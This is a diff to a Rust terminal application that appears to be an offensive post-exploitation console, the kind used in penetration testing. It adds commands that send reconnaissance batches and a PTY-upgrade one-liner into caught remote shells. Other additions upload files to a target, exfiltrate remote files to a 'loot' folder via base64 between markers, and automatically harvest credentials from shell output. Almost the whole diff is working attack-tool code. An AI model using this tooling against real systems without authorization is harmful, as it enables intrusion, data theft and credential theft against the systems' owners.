@@ -2,6 +2,7 @@
 
 use super::palette::{self, Action};
 use crate::catalog::{self, Ctx};
+use crate::engine::postex::{self, Os as PxOs};
 use crate::engine::session::{self, Registry, SessionEvent, SessionId};
 use crate::engine::{Job, JobEvent, JobStatus, Runner, Workspace};
 use crate::model::state::{now_iso, Engagement, Record};
@@ -106,6 +107,15 @@ pub struct Live {
     pub record_id: Option<u64>,
 }
 
+/// In-flight capture of a session's output between markers (for /download).
+struct Capture {
+    start: String,
+    end: String,
+    raw: String,
+    path: std::path::PathBuf,
+    name: String,
+}
+
 pub struct App {
     pub ws: Workspace,
     pub eng: Engagement,
@@ -141,6 +151,8 @@ pub struct App {
     pub live_listeners: usize,
     /// When true, a newly caught shell is attached interactively at once.
     pub auto_attach: bool,
+    captures: HashMap<SessionId, Capture>,
+    sess_text: HashMap<SessionId, String>,
 }
 
 pub async fn run(ws: Workspace, eng: Engagement, parallel: usize) -> Result<()> {
@@ -178,6 +190,8 @@ pub async fn run(ws: Workspace, eng: Engagement, parallel: usize) -> Result<()> 
         live_sessions: 0,
         live_listeners: 0,
         auto_attach: false,
+        captures: HashMap::new(),
+        sess_text: HashMap::new(),
     };
     app.banner();
     app.refresh_suggestions();
@@ -397,6 +411,215 @@ impl App {
         self.push(Line::c(msg, Color::Yellow));
     }
 
+    /// Send an OS-appropriate recon batch through a caught shell.
+    async fn session_enum(&mut self, spec: &str) {
+        let mut it = spec.split_whitespace();
+        let id: SessionId = match it.next().and_then(|s| s.parse().ok()) {
+            Some(i) => i,
+            None => {
+                self.push(Line::c(
+                    "usage: /enum <session-id> [win] [full]",
+                    Color::Yellow,
+                ));
+                return;
+            }
+        };
+        let rest: Vec<&str> = it.collect();
+        let os = if rest.contains(&"win") || rest.contains(&"windows") {
+            PxOs::Windows
+        } else {
+            PxOs::Linux
+        };
+        let full = rest.contains(&"full");
+        let cmds = postex::recon(os, full);
+        let ok = {
+            let reg = self.registry.lock().await;
+            match reg.sessions.get(&id) {
+                Some(sh) if sh.alive => {
+                    for c in &cmds {
+                        sh.send_cmd(&format!("echo ==={c}===; {c}"));
+                    }
+                    true
+                }
+                _ => false,
+            }
+        };
+        if ok {
+            self.push(Line::c(
+                format!("→ sent {} recon commands to session #{id}", cmds.len()),
+                Color::Cyan,
+            ));
+        } else {
+            self.push(Line::c(format!("no live session #{id}"), Color::Yellow));
+        }
+    }
+
+    /// Send the interactive-PTY upgrade one-liner into a shell.
+    async fn session_upgrade(&mut self, spec: &str) {
+        let mut it = spec.split_whitespace();
+        let id: SessionId = match it.next().and_then(|s| s.parse().ok()) {
+            Some(i) => i,
+            None => {
+                self.push(Line::c("usage: /upgrade <session-id> [win]", Color::Yellow));
+                return;
+            }
+        };
+        let os = if it.any(|t| t == "win" || t == "windows") {
+            PxOs::Windows
+        } else {
+            PxOs::Linux
+        };
+        let (cmd, followup) = postex::pty_upgrade(os);
+        let ok = {
+            let reg = self.registry.lock().await;
+            matches!(reg.sessions.get(&id), Some(sh) if sh.alive && { sh.send_cmd(cmd); true })
+        };
+        if ok {
+            self.push(Line::c(
+                format!("→ PTY upgrade sent to session #{id}"),
+                Color::Cyan,
+            ));
+            self.push(Line::c(format!("  {followup}"), Color::DarkGray));
+        } else {
+            self.push(Line::c(format!("no live session #{id}"), Color::Yellow));
+        }
+    }
+
+    /// Upload a local file to the target over the raw shell via base64 chunks.
+    async fn session_upload(&mut self, spec: &str) {
+        let parts: Vec<&str> = spec.split_whitespace().collect();
+        if parts.len() < 2 {
+            self.push(Line::c(
+                "usage: /upload <session-id> <local-file> [remote-path]",
+                Color::Yellow,
+            ));
+            return;
+        }
+        let Ok(id) = parts[0].parse::<SessionId>() else {
+            self.push(Line::c(
+                "usage: /upload <session-id> <local-file> [remote-path]",
+                Color::Yellow,
+            ));
+            return;
+        };
+        let local = parts[1];
+        let data = match std::fs::read(local) {
+            Ok(d) => d,
+            Err(e) => {
+                self.push(Line::c(format!("! {local}: {e}"), Color::Red));
+                return;
+            }
+        };
+        let remote = parts
+            .get(2)
+            .copied()
+            .unwrap_or_else(|| {
+                std::path::Path::new(local)
+                    .file_name()
+                    .and_then(|f| f.to_str())
+                    .unwrap_or("upload.bin")
+            })
+            .to_string();
+        use base64::Engine;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&data);
+        let tmp = format!("{remote}.b64");
+        let reg = self.registry.lock().await;
+        let live = matches!(reg.sessions.get(&id), Some(sh) if sh.alive);
+        if !live {
+            drop(reg);
+            self.push(Line::c(format!("no live session #{id}"), Color::Yellow));
+            return;
+        }
+        let sh = reg.sessions.get(&id).unwrap();
+        sh.send_cmd(&format!(": > {tmp}"));
+        for chunk in b64.as_bytes().chunks(2048) {
+            let c = String::from_utf8_lossy(chunk);
+            sh.send_cmd(&format!("printf %s '{c}' >> {tmp}"));
+        }
+        sh.send_cmd(&format!(
+            "base64 -d {tmp} > {remote} && rm -f {tmp} && echo UPLOAD_OK:{remote}"
+        ));
+        drop(reg);
+        self.push(Line::c(
+            format!(
+                "→ uploaded {} bytes to {remote} on session #{id} (watch for UPLOAD_OK)",
+                data.len()
+            ),
+            Color::Cyan,
+        ));
+    }
+
+    /// Download a remote file over the raw shell (base64 between markers -> loot).
+    async fn session_download(&mut self, spec: &str) {
+        let parts: Vec<&str> = spec.split_whitespace().collect();
+        if parts.len() < 2 {
+            self.push(Line::c(
+                "usage: /download <session-id> <remote-file>",
+                Color::Yellow,
+            ));
+            return;
+        }
+        let Ok(id) = parts[0].parse::<SessionId>() else {
+            self.push(Line::c(
+                "usage: /download <session-id> <remote-file>",
+                Color::Yellow,
+            ));
+            return;
+        };
+        let remote = parts[1].to_string();
+        let base = std::path::Path::new(&remote)
+            .file_name()
+            .and_then(|f| f.to_str())
+            .unwrap_or("download.bin")
+            .to_string();
+        let path = self.ws.loot_dir().join(&base);
+        let marker = format!("{:08x}", self.eng.next_record_id.wrapping_mul(2654435761));
+        let start = format!("SHRK_S_{marker}");
+        let end = format!("SHRK_E_{marker}");
+        let reg = self.registry.lock().await;
+        let live = matches!(reg.sessions.get(&id), Some(sh) if sh.alive);
+        if !live {
+            drop(reg);
+            self.push(Line::c(format!("no live session #{id}"), Color::Yellow));
+            return;
+        }
+        reg.sessions.get(&id).unwrap().send_cmd(&format!(
+            "echo {start}; (base64 -w0 {remote} 2>/dev/null || base64 {remote} 2>/dev/null || openssl base64 -in {remote} 2>/dev/null); echo; echo {end}"
+        ));
+        drop(reg);
+        self.captures.insert(
+            id,
+            Capture {
+                start,
+                end,
+                raw: String::new(),
+                path,
+                name: base.clone(),
+            },
+        );
+        self.push(Line::c(
+            format!("→ downloading {remote} from session #{id} …"),
+            Color::Cyan,
+        ));
+    }
+
+    fn finish_download(&mut self, id: SessionId, cap: Capture, b64: &str) {
+        use base64::Engine;
+        match base64::engine::general_purpose::STANDARD.decode(b64.as_bytes()) {
+            Ok(bytes) if !bytes.is_empty() => match std::fs::write(&cap.path, &bytes) {
+                Ok(_) => self.push(Line::c(
+                    format!("  ⇒ downloaded {} bytes → loot/{}", bytes.len(), cap.name),
+                    Color::Green,
+                )),
+                Err(e) => self.push(Line::c(format!("! write failed: {e}"), Color::Red)),
+            },
+            _ => self.push(Line::c(
+                format!("! download #{id} failed — empty or unreadable (file missing on target?)"),
+                Color::Yellow,
+            )),
+        }
+    }
+
     async fn on_session_event(&mut self, ev: SessionEvent) {
         match ev {
             SessionEvent::Listening { id, port } => {
@@ -424,8 +647,43 @@ impl App {
                 }
             }
             SessionEvent::Output { id, text } => {
+                // If a /download capture is armed for this session, siphon the bytes
+                // between the markers instead of printing them.
+                if let Some(cap) = self.captures.get_mut(&id) {
+                    cap.raw.push_str(&text);
+                    if let (Some(si), Some(ei)) = (cap.raw.find(&cap.start), cap.raw.find(&cap.end))
+                    {
+                        if ei > si {
+                            let b64: String = cap.raw[si + cap.start.len()..ei]
+                                .chars()
+                                .filter(|c| {
+                                    c.is_ascii_alphanumeric() || *c == '+' || *c == '/' || *c == '='
+                                })
+                                .collect();
+                            let done = self.captures.remove(&id).unwrap();
+                            self.finish_download(id, done, &b64);
+                        }
+                    }
+                    return;
+                }
                 for line in text.lines() {
                     self.push(Line::out(format!("[{id}] {line}"), id));
+                }
+                // Auto-harvest credentials/intel from shell output.
+                let acc = self.sess_text.entry(id).or_default();
+                acc.push_str(&text);
+                acc.push('\n');
+                if acc.len() > 400 {
+                    let blob = std::mem::take(acc);
+                    let before = self.eng.creds.len();
+                    let n = parse::intel::harvest(&mut self.eng, &blob, &format!("session #{id}"));
+                    if n > 0 {
+                        self.push(Line::c(
+                            format!("  ⇒ harvested {n} credential(s) from session #{id}"),
+                            Color::Green,
+                        ));
+                        let _ = before;
+                    }
                 }
             }
             SessionEvent::Closed { id, reason } => {
@@ -859,6 +1117,10 @@ impl App {
                 )),
             },
             Action::KillSession(spec) => self.kill_session(&spec).await,
+            Action::SessEnum(spec) => self.session_enum(&spec).await,
+            Action::SessUpgrade(spec) => self.session_upgrade(&spec).await,
+            Action::Upload(spec) => self.session_upload(&spec).await,
+            Action::Download(spec) => self.session_download(&spec).await,
             Action::ViewCmd(name) => {
                 let v = match name.trim().to_ascii_lowercase().as_str() {
                     "console" | "log" => Some(View::Console),
